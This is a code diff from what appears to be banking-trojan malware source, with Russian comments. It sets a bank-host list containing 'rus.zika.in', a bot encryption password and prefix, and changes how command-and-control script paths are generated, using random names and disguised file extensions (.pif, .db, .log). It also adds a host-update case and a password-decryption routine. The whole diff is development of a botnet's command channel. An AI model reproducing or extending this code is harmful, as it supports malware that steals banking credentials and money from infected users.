@@ -91,8 +91,10 @@ namespace CONFIGDEBUGSTRINGS
 		char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = "rus.zika.in\0";
 	#endif
 
-	PCHAR MainPassword    = "bRS8yYpppppp";
-	char BOT_PREFIX[]     = "qxwwnnmo";
+	PCHAR MainPassword    = "bRS8yYQ0APq9xfzC";
+
+
+	char BOT_PREFIX[]     = "aaawwwst";
 	PCHAR DebugDelay      = "1";
 
 #endif
@@ -140,10 +142,14 @@ const static char PathRemoteLog[]   = {'/','p','a','t','/','s','c','r','l','.','
 
 
 // Расширения доступные для папки SET
-const static PCHAR SETFolderExts[] = {".phtml", ".php3", ".phtm", ".inc", ".7z"};
+const static PCHAR SETFolderExts[] = {".phtml", ".php3", ".phtm", ".inc", ".7z", NULL};
 
 // Расширения доступные для папки GET
-const static PCHAR GETFolderExts[] = {".cgi", ".pl", ".doc", ".rtf", ".tpl", ".rar"};
+const static PCHAR GETFolderExts[] = {".cgi", ".pl", ".doc", ".rtf", ".tpl", ".rar", NULL};
+
+// Массив расширений скриптов обновления
+const static PCHAR UpdateScriptsExts[] = {".pif", ".db", ".log", NULL};
+
 
 
 const static char HTTPProtocol[] = "http://";
@@ -229,7 +235,8 @@ char *GetPrefix(bool CheckBankingMode)
 		// поддерживает шифрование и защиту алресов
 		Created = false;
 		DWORD Min1, Max1, Min2, Max2;
-        bool IsGetScript = false;
+		bool IsGetScript = false;
+		PCHAR *Exts = NULL;
 
 		#define RANGE(IsGet, Mn1, Mx1, Mn2, Mx2) {Min1 = Mn1; Max1 = Mx1; \
 												  Min2 = Mn2; Max2 = Mx2; \
@@ -255,6 +262,9 @@ char *GetPrefix(bool CheckBankingMode)
 			case SCRIPT_HUNTER:       RANGE(false, 49, 56, 48, 56);
 			case SCRIPT_PLUGINS_LIST: RANGE(false, 57, 64, 57, 64);
 			case SCRIPT_REMOTE_LOG:   return (PCHAR)PathRemoteLog;
+
+			// ссылки из массива обновлений
+			case SCRIPT_UPDATE_HOSTS: Exts = (PCHAR*)&UpdateScriptsExts[0]; RANGE(false, 7, 9, 7, 9);
 		default:
 			return NULL;
 		}
@@ -262,19 +272,16 @@ char *GetPrefix(bool CheckBankingMode)
 
 		// Генерируем путь
         Created = true;
-		DWORD ExtCount = 0;
-		if (IsGetScript)
-			ExtCount = sizeof(GETFolderExts) / sizeof(PCHAR);
-		else
-			ExtCount = sizeof(SETFolderExts) / sizeof(PCHAR);
+		// Устанавливаем расширения
+		if (!Exts)
+		{
+			if (IsGetScript)
+				Exts = (PCHAR*)&GETFolderExts[0];
+			else
+				Exts = (PCHAR*)&SETFolderExts[0];
+		}
 
-		PCHAR *Exts = NULL;
-		if (IsGetScript)
-			Exts = (PCHAR*)&GETFolderExts[0];
-		else
-			Exts = (PCHAR*)&SETFolderExts[0];
-
-		return GenerateRandomScript(Min1, Max1, Min2, Max2, ExtCount, Exts);
+		return GenerateRandomScript(Min1, Max1, Min2, Max2, Exts);
 
 	}
 //-----------------------------------------------------------------------------
@@ -606,7 +613,7 @@ PCHAR GetMainPassword(bool NotNULL)
 	// Проверяем задан ли в боте пароль
 	if (!STRA::IsEmpty(MainPassword) && STRA::Hash(MainPassword) != BOTPARAM_HASH_PASSWORD)
 	{
-		Passw = STR::Alloc(STRA::Length(MainPassword));
+		Passw = STR::New(MainPassword);
         if (BOTPARAM_ENCRYPTED_PASSWORD)
 			Decrypt(MainPassword, Passw);
 	}
@@ -623,7 +630,28 @@ PCHAR GetMainPassword(bool NotNULL)
 }
 //----------------------------------------------------------------------------
 
-PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, DWORD ExtsCount, PCHAR *Exts)
+string GetMainPassword2(bool NotNULL)
+{
+	// Функция возвращает пароль шифрования
+	string Pass;
+
+	// Проверяем задан ли в боте пароль
+	if (!STRA::IsEmpty(MainPassword) && STRA::Hash(MainPassword) != BOTPARAM_HASH_PASSWORD)
+	{
+		Pass = MainPassword;
+        if (BOTPARAM_ENCRYPTED_PASSWORD)
+			Decrypt(MainPassword, Pass.t_str());
+	}
+
+	// В случае необходимости возвращаем cтандартный пароль
+	if (NotNULL && Pass.IsEmpty())
+		Pass = DefaultPassword;
+
+	return Pass;
+}
+//----------------------------------------------------------------------------
+
+PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, PCHAR *Exts)
 {
 	// Функция генерирует случайное имя скрипта
 	DWORD Sz = 0;
@@ -636,9 +664,13 @@ PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, DWORD
 
 	// Добавляем расширение скрипта
 
+	DWORD ExtsCount = 0;
+	while (Exts[ExtsCount]) ExtsCount++;
+
+
 	DWORD ExtPos = Random::Generate(1, ExtsCount);
-	for (DWORD i = 1; i < ExtPos; i++, Exts++);
-	PCHAR Ext = *Exts;
+	ExtPos--;
+	PCHAR Ext = *(Exts + ExtPos);
 
 	PCHAR Script = STR::New(3, "/", Name, Ext);
 
